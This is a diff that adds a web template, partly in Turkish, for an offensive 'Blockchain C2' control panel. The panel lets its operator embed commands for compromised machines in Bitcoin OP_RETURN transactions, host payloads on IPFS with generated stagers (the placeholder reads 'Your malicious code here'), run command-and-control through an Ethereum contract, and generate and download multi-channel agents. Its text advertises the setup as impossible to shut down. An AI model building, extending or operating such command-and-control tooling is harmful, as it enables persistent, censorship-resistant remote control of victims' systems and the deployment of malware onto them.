@@ -1,0 +1,936 @@
+{% extends "base.html" %}
+{% block title %}Blockchain C2 - Kapatılamayan Sunucular{% endblock %}
+
+{% block extra_css %}
+<style>
+    /* Button Styles */
+    .btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        padding: 12px 20px;
+        font-size: 14px;
+        font-weight: 600;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        border: 2px solid transparent;
+    }
+    
+    .btn-warning {
+        background: linear-gradient(135deg, #f7931a, #e67e00) !important;
+        color: #000 !important;
+        border-color: #f7931a !important;
+    }
+    
+    .btn-warning:hover {
+        background: linear-gradient(135deg, #e67e00, #cc6600) !important;
+        box-shadow: 0 0 25px rgba(247, 147, 26, 0.6);
+        transform: translateY(-2px);
+    }
+    
+    .btn-success {
+        background: linear-gradient(135deg, #00ff88, #00cc6a) !important;
+        color: #000 !important;
+        border-color: #00ff88 !important;
+    }
+    
+    .btn-success:hover {
+        background: linear-gradient(135deg, #00cc6a, #009950) !important;
+        box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+    }
+    
+    .btn-info {
+        background: linear-gradient(135deg, #00bfff, #0099cc) !important;
+        color: #fff !important;
+        border-color: #00bfff !important;
+    }
+    
+    .btn-info:hover {
+        background: linear-gradient(135deg, #0099cc, #007799) !important;
+        box-shadow: 0 0 20px rgba(0, 191, 255, 0.5);
+    }
+    
+    .btn-primary {
+        background: linear-gradient(135deg, #627eea, #4c63bc) !important;
+        color: #fff !important;
+        border-color: #627eea !important;
+    }
+    
+    .btn-primary:hover {
+        background: linear-gradient(135deg, #4c63bc, #3d4f96) !important;
+        box-shadow: 0 0 20px rgba(98, 126, 234, 0.5);
+    }
+    
+    .btn-danger {
+        background: linear-gradient(135deg, #ff4444, #cc0000) !important;
+        color: #fff !important;
+        border-color: #ff4444 !important;
+    }
+    
+    .btn-outline-warning {
+        background: transparent !important;
+        color: #f7931a !important;
+        border: 2px solid #f7931a !important;
+    }
+    
+    .btn-outline-warning:hover {
+        background: rgba(247, 147, 26, 0.2) !important;
+    }
+    
+    .btn-outline-info {
+        background: transparent !important;
+        color: #00bfff !important;
+        border: 2px solid #00bfff !important;
+    }
+    
+    .btn-outline-info:hover {
+        background: rgba(0, 191, 255, 0.2) !important;
+    }
+    
+    .btn-outline-secondary {
+        background: transparent !important;
+        color: #888 !important;
+        border: 2px solid #555 !important;
+    }
+    
+    .btn-outline-secondary:hover {
+        background: rgba(136, 136, 136, 0.2) !important;
+        color: #fff !important;
+    }
+    
+    .btn-sm { padding: 6px 12px; font-size: 12px; }
+    .btn-lg { padding: 15px 30px; font-size: 16px; }
+    
+    /* Card Styles */
+    .card {
+        background: linear-gradient(145deg, #1a1a2e, #16213e);
+        border: 1px solid #333;
+        border-radius: 12px;
+        overflow: hidden;
+    }
+    
+    .card-header {
+        background: rgba(0, 0, 0, 0.3);
+        border-bottom: 1px solid #333;
+        padding: 15px 20px;
+        color: #f7931a;
+        font-weight: 600;
+    }
+    
+    .card-body { padding: 20px; }
+    
+    /* Form Styles */
+    .form-control, .form-select {
+        background-color: #1a1a2e !important;
+        border: 2px solid #f7931a !important;
+        color: #fff !important;
+        padding: 12px 15px;
+        border-radius: 8px;
+    }
+    
+    .form-control:focus, .form-select:focus {
+        border-color: #ffaa00 !important;
+        box-shadow: 0 0 15px rgba(247, 147, 26, 0.3) !important;
+    }
+    
+    .form-control::placeholder { color: #666 !important; }
+    .form-label { color: #888; font-size: 14px; margin-bottom: 8px; display: block; }
+    
+    /* Blockchain Specific */
+    .blockchain-hero {
+        background: linear-gradient(135deg, #1a0a00 0%, #2a1a00 50%, #1a1a2e 100%);
+        border-radius: 15px;
+        padding: 40px;
+        position: relative;
+        overflow: hidden;
+        margin-bottom: 30px;
+        border: 1px solid #f7931a33;
+    }
+    
+    .blockchain-hero::before {
+        content: '';
+        position: absolute;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M30 0L60 30L30 60L0 30Z' fill='none' stroke='%23f7931a' stroke-opacity='0.1'/%3E%3C/svg%3E");
+        pointer-events: none;
+    }
+    
+    .crypto-icon {
+        font-size: 4rem;
+        margin-bottom: 15px;
+        filter: drop-shadow(0 0 20px rgba(247, 147, 26, 0.5));
+    }
+    
+    .method-card {
+        background: linear-gradient(145deg, #1a1a2e, #16213e);
+        border: 2px solid #333;
+        border-radius: 15px;
+        padding: 25px;
+        text-align: center;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        height: 100%;
+    }
+    
+    .method-card:hover {
+        transform: translateY(-5px);
+    }
+    
+    .method-card.bitcoin:hover {
+        border-color: #f7931a;
+        box-shadow: 0 0 30px rgba(247, 147, 26, 0.3);
+    }
+    
+    .method-card.ethereum:hover {
+        border-color: #627eea;
+        box-shadow: 0 0 30px rgba(98, 126, 234, 0.3);
+    }
+    
+    .method-card.ipfs:hover {
+        border-color: #00bfff;
+        box-shadow: 0 0 30px rgba(0, 191, 255, 0.3);
+    }
+    
+    .method-card.dogecoin:hover {
+        border-color: #c3a634;
+        box-shadow: 0 0 30px rgba(195, 166, 52, 0.3);
+    }
+    
+    .method-icon { font-size: 3rem; margin-bottom: 10px; }
+    .method-name { font-size: 1.1rem; font-weight: bold; color: #fff; margin-bottom: 8px; }
+    .method-desc { color: #888; font-size: 0.85rem; }
+    
+    .stat-badge {
+        display: inline-block;
+        padding: 4px 10px;
+        border-radius: 15px;
+        font-size: 0.75rem;
+        margin: 3px;
+    }
+    
+    .stat-cost { background: rgba(247, 147, 26, 0.2); color: #f7931a; }
+    .stat-latency { background: rgba(0, 191, 255, 0.2); color: #00bfff; }
+    .stat-stealth { background: rgba(0, 255, 136, 0.2); color: #00ff88; }
+    
+    /* Code Display */
+    .code-display {
+        background: #0a0a0a;
+        border: 1px solid #333;
+        border-radius: 8px;
+        padding: 15px;
+        font-family: 'Courier New', monospace;
+        font-size: 0.85rem;
+        color: #f7931a;
+        max-height: 400px;
+        overflow-y: auto;
+        white-space: pre-wrap;
+    }
+    
+    .code-display.ipfs { color: #00bfff; }
+    .code-display.ethereum { color: #627eea; }
+    
+    /* Terminal */
+    .terminal-output {
+        background: #0a0a0a;
+        border: 1px solid #333;
+        border-radius: 8px;
+        padding: 15px;
+        font-family: 'Courier New', monospace;
+        font-size: 0.85rem;
+        color: #00ff88;
+        max-height: 200px;
+        overflow-y: auto;
+    }
+    
+    /* OP_RETURN Display */
+    .op-return-display {
+        background: #0a0a0a;
+        border: 2px solid #f7931a;
+        border-radius: 10px;
+        padding: 20px;
+        text-align: center;
+    }
+    
+    .op-return-hex {
+        font-family: 'Courier New', monospace;
+        font-size: 1rem;
+        color: #f7931a;
+        word-break: break-all;
+        padding: 15px;
+        background: rgba(247, 147, 26, 0.1);
+        border-radius: 8px;
+    }
+    
+    /* IPFS Display */
+    .ipfs-cid-display {
+        font-family: 'Courier New', monospace;
+        font-size: 1.2rem;
+        color: #00bfff;
+        padding: 15px;
+        background: rgba(0, 191, 255, 0.1);
+        border: 1px solid #00bfff;
+        border-radius: 8px;
+        text-align: center;
+        word-break: break-all;
+    }
+    
+    .gateway-list {
+        max-height: 150px;
+        overflow-y: auto;
+    }
+    
+    .gateway-item {
+        padding: 8px 12px;
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 5px;
+        margin-bottom: 5px;
+        font-family: 'Courier New', monospace;
+        font-size: 0.8rem;
+        color: #00bfff;
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+    
+    .gateway-item:hover {
+        background: rgba(0, 191, 255, 0.2);
+    }
+    
+    /* Tabs */
+    .nav-tabs {
+        border-bottom: 2px solid #333;
+    }
+    
+    .nav-tabs .nav-link {
+        background: transparent;
+        border: none;
+        color: #888;
+        padding: 15px 25px;
+        font-weight: 600;
+    }
+    
+    .nav-tabs .nav-link:hover { color: #fff; }
+    
+    .nav-tabs .nav-link.active {
+        color: #f7931a;
+        border-bottom: 3px solid #f7931a;
+    }
+    
+    /* Badge */
+    .badge {
+        padding: 5px 10px;
+        border-radius: 5px;
+        font-size: 0.75rem;
+        font-weight: 600;
+    }
+    
+    .bg-warning { background: rgba(247, 147, 26, 0.2) !important; color: #f7931a !important; }
+    .bg-success { background: rgba(0, 255, 136, 0.2) !important; color: #00ff88 !important; }
+    .bg-info { background: rgba(0, 191, 255, 0.2) !important; color: #00bfff !important; }
+    .bg-danger { background: rgba(255, 68, 68, 0.2) !important; color: #ff4444 !important; }
+    
+    /* Animation */
+    @keyframes blockchain-pulse {
+        0%, 100% { box-shadow: 0 0 20px rgba(247, 147, 26, 0.3); }
+        50% { box-shadow: 0 0 40px rgba(247, 147, 26, 0.6); }
+    }
+    
+    .transmitting { animation: blockchain-pulse 1s infinite; }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="container-fluid">
+    <!-- Hero -->
+    <div class="blockchain-hero">
+        <div class="row align-items-center">
+            <div class="col-md-8">
+                <h1 class="text-white mb-3">
+                    <span style="font-size: 3rem;">₿</span>
+                    Blockchain C2
+                </h1>
+                <p class="text-secondary mb-0" style="font-size: 1.1rem;">
+                    Kapatılamayan sunucular! Devletler Bitcoin'i kapatamadığı sürece 
+                    senin C2 hattını kimse kesemez. IPFS ile engellenemez payload hosting.
+                </p>
+            </div>
+            <div class="col-md-4 text-end">
+                <span class="badge bg-warning me-2">🔗 DECENTRALIZED</span>
+                <span class="badge bg-success">♾️ UNSTOPPABLE</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Method Cards -->
+    <div class="row mb-4">
+        {% for key, method in methods.items() %}
+        <div class="col-md-3 mb-3">
+            <div class="method-card {{ key }}" onclick="selectMethod('{{ key }}')">
+                <div class="method-icon">{{ method.icon }}</div>
+                <div class="method-name">{{ method.name }}</div>
+                <div class="method-desc">{{ method.description }}</div>
+                <div class="mt-3">
+                    <span class="stat-badge stat-cost">{{ method.cost }}</span>
+                    <span class="stat-badge stat-latency">{{ method.latency }}</span>
+                    <span class="stat-badge stat-stealth">{{ method.stealth }}</span>
+                </div>
+            </div>
+        </div>
+        {% endfor %}
+    </div>
+
+    <!-- Main Tabs -->
+    <ul class="nav nav-tabs mb-4">
+        <li class="nav-item">
+            <a class="nav-link active" data-bs-toggle="tab" href="#bitcoin-tab">
+                <span style="color: #f7931a;">₿</span> Bitcoin C2
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-bs-toggle="tab" href="#ipfs-tab">
+                <span style="color: #00bfff;">🌐</span> IPFS Hosting
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-bs-toggle="tab" href="#ethereum-tab">
+                <span style="color: #627eea;">Ξ</span> Ethereum Contract
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-bs-toggle="tab" href="#agent-tab">
+                <i class="fas fa-robot"></i> Agent Generator
+            </a>
+        </li>
+    </ul>
+
+    <div class="tab-content">
+        <!-- Bitcoin Tab -->
+        <div class="tab-pane fade show active" id="bitcoin-tab">
+            <div class="row">
+                <div class="col-lg-5">
+                    <div class="card mb-4">
+                        <div class="card-header">
+                            <i class="fab fa-bitcoin me-2" style="color: #f7931a;"></i>Bitcoin OP_RETURN C2
+                        </div>
+                        <div class="card-body">
+                            <p class="text-secondary small mb-3">
+                                Komutlarını Bitcoin blockchain'ine göm. Ajanlar blockchain'i izler,
+                                senin sunucuna hiç bağlanmaz!
+                            </p>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Command Type</label>
+                                <select class="form-select" id="btc-cmd-type">
+                                    {% for key, cmd in command_types.items() %}
+                                    <option value="{{ key }}">{{ cmd.icon }} {{ cmd.name }}</option>
+                                    {% endfor %}
+                                </select>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Payload / Command</label>
+                                <textarea class="form-control" id="btc-payload" rows="2" 
+                                          placeholder="whoami">whoami && hostname</textarea>
+                            </div>
+                            
+                            <div class="form-check mb-3">
+                                <input class="form-check-input" type="checkbox" id="btc-encrypt" checked>
+                                <label class="form-check-label text-secondary">
+                                    <i class="fas fa-lock me-1"></i> Encrypt payload (XOR)
+                                </label>
+                            </div>
+                            
+                            <div class="d-grid gap-2">
+                                <button class="btn btn-warning" onclick="createBitcoinCommand()">
+                                    <i class="fab fa-bitcoin me-1"></i> Generate OP_RETURN
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <i class="fas fa-info-circle me-2"></i>Nasıl Çalışır?
+                        </div>
+                        <div class="card-body">
+                            <ol class="text-secondary small mb-0">
+                                <li class="mb-2">OP_RETURN komutu oluştur (maks 80 byte)</li>
+                                <li class="mb-2">Bitcoin cüzdanından işlem gönder</li>
+                                <li class="mb-2">~0.0001 BTC + network fee öde</li>
+                                <li class="mb-2">İşlem blockchain'e yazılır (kalıcı!)</li>
+                                <li class="mb-2">Ajanlar watch address'i izler</li>
+                                <li>Komut alınır ve çalıştırılır 🎯</li>
+                            </ol>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-lg-7">
+                    <div class="card mb-4">
+                        <div class="card-header d-flex justify-content-between align-items-center">
+                            <span><i class="fas fa-code me-2"></i>OP_RETURN Output</span>
+                            <button class="btn btn-sm btn-outline-warning" onclick="copyOpReturn()">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </div>
+                        <div class="card-body">
+                            <div class="op-return-display">
+                                <div class="text-muted mb-2">HEX Data (paste in wallet)</div>
+                                <div class="op-return-hex" id="op-return-hex">
+                                    Click "Generate OP_RETURN" to create command
+                                </div>
+                            </div>
+                            
+                            <div class="row mt-4">
+                                <div class="col-4 text-center">
+                                    <div class="text-muted small">Size</div>
+                                    <div class="text-warning" id="btc-size">-- bytes</div>
+                                </div>
+                                <div class="col-4 text-center">
+                                    <div class="text-muted small">Network</div>
+                                    <div class="text-info" id="btc-network">Testnet</div>
+                                </div>
+                                <div class="col-4 text-center">
+                                    <div class="text-muted small">Est. Cost</div>
+                                    <div class="text-success" id="btc-cost">~0.0001 BTC</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <i class="fas fa-wallet me-2"></i>Transaction Instructions
+                        </div>
+                        <div class="card-body">
+                            <div class="terminal-output" id="btc-instructions">
+                                <div class="text-secondary">[*] Generate a command first...</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- IPFS Tab -->
+        <div class="tab-pane fade" id="ipfs-tab">
+            <div class="row">
+                <div class="col-lg-5">
+                    <div class="card mb-4">
+                        <div class="card-header" style="color: #00bfff;">
+                            <i class="fas fa-globe me-2"></i>IPFS Payload Hosting
+                        </div>
+                        <div class="card-body">
+                            <p class="text-secondary small mb-3">
+                                Payload'ları merkezi sunucu yerine dağıtık IPFS ağında barındır.
+                                Hash değişmez, kaynaklar değişir - engellemek imkansız!
+                            </p>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Payload Content</label>
+                                <textarea class="form-control" id="ipfs-content" rows="5" 
+                                          placeholder="Enter your payload code...">#!/usr/bin/env python3
+import os
+import socket
+
+# Your malicious code here
+print(f"Hostname: {socket.gethostname()}")
+print(f"User: {os.getenv('USER')}")</textarea>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Filename</label>
+                                <input type="text" class="form-control" id="ipfs-filename" value="payload.py">
+                            </div>
+                            
+                            <div class="form-check mb-3">
+                                <input class="form-check-input" type="checkbox" id="ipfs-encrypt" checked>
+                                <label class="form-check-label text-secondary">
+                                    <i class="fas fa-lock me-1"></i> Encrypt payload
+                                </label>
+                            </div>
+                            
+                            <div class="d-grid gap-2">
+                                <button class="btn btn-info" onclick="uploadToIPFS()">
+                                    <i class="fas fa-upload me-1"></i> Upload to IPFS
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-lg-7">
+                    <div class="card mb-4">
+                        <div class="card-header" style="color: #00bfff;">
+                            <i class="fas fa-fingerprint me-2"></i>Content ID (CID)
+                        </div>
+                        <div class="card-body">
+                            <div class="ipfs-cid-display" id="ipfs-cid">
+                                QmXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+                            </div>
+                            
+                            <div class="mt-4">
+                                <label class="form-label">Available Gateways</label>
+                                <div class="gateway-list" id="gateway-list">
+                                    <div class="gateway-item">https://ipfs.io/ipfs/...</div>
+                                    <div class="gateway-item">https://cloudflare-ipfs.com/ipfs/...</div>
+                                    <div class="gateway-item">https://dweb.link/ipfs/...</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header d-flex justify-content-between" style="color: #00bfff;">
+                            <span><i class="fas fa-code me-2"></i>Stager Code</span>
+                            <button class="btn btn-sm btn-outline-info" onclick="copyStager()">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </div>
+                        <div class="card-body p-0">
+                            <pre class="code-display ipfs" id="ipfs-stager" style="margin: 0;">
+# Upload a payload to generate stager code
+</pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Ethereum Tab -->
+        <div class="tab-pane fade" id="ethereum-tab">
+            <div class="row">
+                <div class="col-lg-5">
+                    <div class="card mb-4">
+                        <div class="card-header" style="color: #627eea;">
+                            <i class="fab fa-ethereum me-2"></i>Smart Contract C2
+                        </div>
+                        <div class="card-body">
+                            <p class="text-secondary small mb-3">
+                                Ethereum akıllı kontratı üzerinden C2 operasyonları.
+                                Komutlar kontrata yazılır, ajanlar kontratı okur.
+                            </p>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Contract Address</label>
+                                <input type="text" class="form-control" id="eth-contract" 
+                                       placeholder="0x..." value="0x1234567890abcdef1234567890abcdef12345678">
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">RPC URL</label>
+                                <input type="text" class="form-control" id="eth-rpc" 
+                                       value="https://sepolia.infura.io/v3/YOUR_KEY">
+                            </div>
+                            
+                            <div class="d-grid gap-2">
+                                <button class="btn btn-primary" onclick="getEthContract()">
+                                    <i class="fas fa-file-code me-1"></i> Get Contract Code
+                                </button>
+                                <button class="btn btn-outline-info" onclick="generateEthAgent()">
+                                    <i class="fas fa-robot me-1"></i> Generate Agent
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-lg-7">
+                    <div class="card">
+                        <div class="card-header d-flex justify-content-between" style="color: #627eea;">
+                            <span><i class="fas fa-file-contract me-2"></i>Solidity Contract</span>
+                            <button class="btn btn-sm btn-outline-secondary" onclick="copyContract()">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </div>
+                        <div class="card-body p-0">
+                            <pre class="code-display ethereum" id="eth-contract-code" style="margin: 0; max-height: 500px;">
+// Click "Get Contract Code" to load
+</pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Agent Generator Tab -->
+        <div class="tab-pane fade" id="agent-tab">
+            <div class="row">
+                <div class="col-lg-4">
+                    <div class="card">
+                        <div class="card-header">
+                            <i class="fas fa-cogs me-2"></i>Agent Configuration
+                        </div>
+                        <div class="card-body">
+                            <div class="mb-3">
+                                <label class="form-label">C2 Channels</label>
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="agent-btc" checked>
+                                    <label class="form-check-label text-secondary">₿ Bitcoin</label>
+                                </div>
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="agent-ipfs" checked>
+                                    <label class="form-check-label text-secondary">🌐 IPFS</label>
+                                </div>
+                                <div class="form-check">
+                                    <input class="form-check-input" type="checkbox" id="agent-eth">
+                                    <label class="form-check-label text-secondary">Ξ Ethereum</label>
+                                </div>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Watch Address (Bitcoin)</label>
+                                <input type="text" class="form-control" id="agent-watch-addr" 
+                                       value="1MonolithC2WatchAddressXXXXXXXX">
+                            </div>
+                            
+                            <div class="d-grid gap-2">
+                                <button class="btn btn-danger" onclick="generateFullAgent()">
+                                    <i class="fas fa-bug me-1"></i> Generate Agent
+                                </button>
+                                <button class="btn btn-outline-success" onclick="downloadAgent()">
+                                    <i class="fas fa-download me-1"></i> Download
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-lg-8">
+                    <div class="card">
+                        <div class="card-header d-flex justify-content-between">
+                            <span><i class="fas fa-code me-2"></i>Multi-Channel Agent Code</span>
+                            <button class="btn btn-sm btn-outline-secondary" onclick="copyAgent()">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </div>
+                        <div class="card-body p-0">
+                            <pre class="code-display" id="agent-code" style="margin: 0; max-height: 600px; color: #00ff88;">
+# Click "Generate Agent" to create multi-channel C2 agent
+</pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Terminal -->
+    <div class="row mt-4">
+        <div class="col-12">
+            <div class="card">
+                <div class="card-header d-flex justify-content-between">
+                    <span><i class="fas fa-terminal me-2"></i>Activity Log</span>
+                    <button class="btn btn-sm btn-outline-secondary" onclick="clearLog()">
+                        <i class="fas fa-trash"></i>
+                    </button>
+                </div>
+                <div class="card-body p-0">
+                    <div class="terminal-output" id="activity-log">
+                        <div class="text-success">[+] Blockchain C2 initialized</div>
+                        <div class="text-warning">[!] Decentralized = Unstoppable</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+function log(message, type = 'info') {
+    const logDiv = document.getElementById('activity-log');
+    const timestamp = new Date().toLocaleTimeString();
+    let color = 'text-secondary';
+    let prefix = '[*]';
+    
+    if (type === 'success') { color = 'text-success'; prefix = '[+]'; }
+    else if (type === 'error') { color = 'text-danger'; prefix = '[-]'; }
+    else if (type === 'warning') { color = 'text-warning'; prefix = '[!]'; }
+    else if (type === 'btc') { color = 'text-warning'; prefix = '[₿]'; }
+    else if (type === 'ipfs') { color = 'text-info'; prefix = '[IPFS]'; }
+    
+    logDiv.innerHTML += `<div class="${color}">${prefix} [${timestamp}] ${message}</div>`;
+    logDiv.scrollTop = logDiv.scrollHeight;
+}
+
+function clearLog() {
+    document.getElementById('activity-log').innerHTML = '<div class="text-success">[+] Log cleared</div>';
+}
+
+function selectMethod(method) {
+    log(`Selected method: ${method}`, 'info');
+}
+
+async function createBitcoinCommand() {
+    const cmdType = document.getElementById('btc-cmd-type').value;
+    const payload = document.getElementById('btc-payload').value;
+    const encrypt = document.getElementById('btc-encrypt').checked;
+    
+    log('Creating Bitcoin OP_RETURN command...', 'btc');
+    
+    try {
+        const response = await fetch('/blockchain-c2/api/bitcoin/create-command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ command_type: cmdType, payload, encrypt })
+        });
+        const result = await response.json();
+        
+        if (result.success) {
+            document.getElementById('op-return-hex').textContent = result.op_return_hex;
+            document.getElementById('btc-size').textContent = `${result.size} bytes`;
+            document.getElementById('btc-network').textContent = result.network;
+            
+            const instructions = document.getElementById('btc-instructions');
+            instructions.innerHTML = result.instructions.map(i => 
+                `<div class="text-success">[+] ${i}</div>`
+            ).join('');
+            
+            log(`Command created: ${result.command_id}`, 'success');
+            log(`Size: ${result.size} bytes, Network: ${result.network}`, 'info');
+        }
+    } catch (error) {
+        log(`Error: ${error.message}`, 'error');
+    }
+}
+
+async function uploadToIPFS() {
+    const content = document.getElementById('ipfs-content').value;
+    const filename = document.getElementById('ipfs-filename').value;
+    const encrypt = document.getElementById('ipfs-encrypt').checked;
+    
+    log('Uploading to IPFS...', 'ipfs');
+    
+    try {
+        const response = await fetch('/blockchain-c2/api/ipfs/upload', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content, filename, encrypt })
+        });
+        const result = await response.json();
+        
+        if (result.success) {
+            document.getElementById('ipfs-cid').textContent = result.cid;
+            
+            const gatewayList = document.getElementById('gateway-list');
+            gatewayList.innerHTML = result.gateways.map(g => 
+                `<div class="gateway-item" onclick="window.open('${g}', '_blank')">${g}</div>`
+            ).join('');
+            
+            document.getElementById('ipfs-stager').textContent = result.stager_code;
+            
+            log(`Uploaded! CID: ${result.cid}`, 'success');
+            log(`Available via ${result.gateways.length} gateways`, 'info');
+        }
+    } catch (error) {
+        log(`Error: ${error.message}`, 'error');
+    }
+}
+
+async function getEthContract() {
+    log('Fetching Ethereum contract...', 'info');
+    
+    try {
+        const response = await fetch('/blockchain-c2/api/ethereum/contract');
+        const result = await response.json();
+        
+        if (result.success) {
+            document.getElementById('eth-contract-code').textContent = result.contract_code;
+            log('Contract loaded!', 'success');
+        }
+    } catch (error) {
+        log(`Error: ${error.message}`, 'error');
+    }
+}
+
+async function generateEthAgent() {
+    const contractAddr = document.getElementById('eth-contract').value;
+    const rpcUrl = document.getElementById('eth-rpc').value;
+    
+    log('Generating Ethereum agent...', 'info');
+    
+    try {
+        const response = await fetch('/blockchain-c2/api/ethereum/generate-agent', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ contract_address: contractAddr, rpc_url: rpcUrl })
+        });
+        const result = await response.json();
+        
+        if (result.success) {
+            document.getElementById('agent-code').textContent = result.agent_code;
+            log('Ethereum agent generated!', 'success');
+        }
+    } catch (error) {
+        log(`Error: ${error.message}`, 'error');
+    }
+}
+
+async function generateFullAgent() {
+    const methods = [];
+    if (document.getElementById('agent-btc').checked) methods.push('bitcoin');
+    if (document.getElementById('agent-ipfs').checked) methods.push('ipfs');
+    if (document.getElementById('agent-eth').checked) methods.push('ethereum');
+    
+    log(`Generating multi-channel agent: ${methods.join(', ')}`, 'info');
+    
+    try {
+        const response = await fetch('/blockchain-c2/api/full-agent', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ methods })
+        });
+        const result = await response.json();
+        
+        if (result.success) {
+            document.getElementById('agent-code').textContent = result.agent_code;
+            log('Multi-channel agent generated!', 'success');
+        }
+    } catch (error) {
+        log(`Error: ${error.message}`, 'error');
+    }
+}
+
+function downloadAgent() {
+    const methods = [];
+    if (document.getElementById('agent-btc').checked) methods.push('bitcoin');
+    if (document.getElementById('agent-ipfs').checked) methods.push('ipfs');
+    if (document.getElementById('agent-eth').checked) methods.push('ethereum');
+    
+    window.location.href = `/blockchain-c2/api/download/agent?methods=${methods.join(',')}`;
+    log('Downloading agent...', 'info');
+}
+
+function copyOpReturn() {
+    const hex = document.getElementById('op-return-hex').textContent;
+    navigator.clipboard.writeText(hex);
+    log('OP_RETURN hex copied!', 'success');
+}
+
+function copyStager() {
+    const code = document.getElementById('ipfs-stager').textContent;
+    navigator.clipboard.writeText(code);
+    log('IPFS stager copied!', 'success');
+}
+
+function copyContract() {
+    const code = document.getElementById('eth-contract-code').textContent;
+    navigator.clipboard.writeText(code);
+    log('Contract copied!', 'success');
+}
+
+function copyAgent() {
+    const code = document.getElementById('agent-code').textContent;
+    navigator.clipboard.writeText(code);
+    log('Agent code copied!', 'success');
+}
+
+// Initialize
+document.addEventListener('DOMContentLoaded', function() {
+    log('Blockchain C2 ready - Decentralized & Unstoppable!', 'success');
+});
+</script>
+{% endblock %}
